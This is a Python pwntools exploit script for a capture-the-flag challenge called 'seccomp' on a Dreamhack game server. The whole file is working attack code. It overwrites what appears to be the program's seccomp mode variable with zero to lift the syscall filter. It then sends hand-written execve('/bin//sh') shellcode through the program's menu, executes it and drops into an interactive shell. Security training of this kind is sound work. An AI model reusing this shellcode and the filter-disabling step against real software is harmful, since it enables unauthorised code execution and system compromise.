#seccomp_test.py
from pwn import *

p = remote("host1.dreamhack.games", 16548)
# p = process("./seccomp")
e = ELF("./seccomp")

# gdb.attach(p)
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

shell_addr = 0x7ffff7ffb000
slog("shell_addr", shell_addr)

shell_code = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

def shell2int(shell_code, i):
    tmp_shell="0x"
    for j in range(i,i+8,1):
        tmp_shell += str("{0:x}".format(shell_code[j]))
        if(j == 28):
            tmp_shell += str("{0:x}".format(shell_code[j])) + str(0)
            tmp_shell += str("{0:x}".format(shell_code[j])) + str(0)
            tmp_shell += str("{0:x}".format(shell_code[j]))
            tmp_shell += "00"
    
    return(int(tmp_shell,16))

def read(shellcode):
    p.sendlineafter("> ", "1")
    p.sendafter(":", shellcode)

def execute():
    p.sendlineafter("> ", "2")

def write(addr, value):
    p.sendlineafter("> ", "3")
    p.sendlineafter("addr: ", str(addr))
    p.sendlineafter("value: ", str(value))

# for i in range(0,len(shell_code),8):
#     write(shell_addr+i, shell2int(shell_code,i))

write(0x0000000000602090, 0)
read(shell_code)
execute()

p.interactive()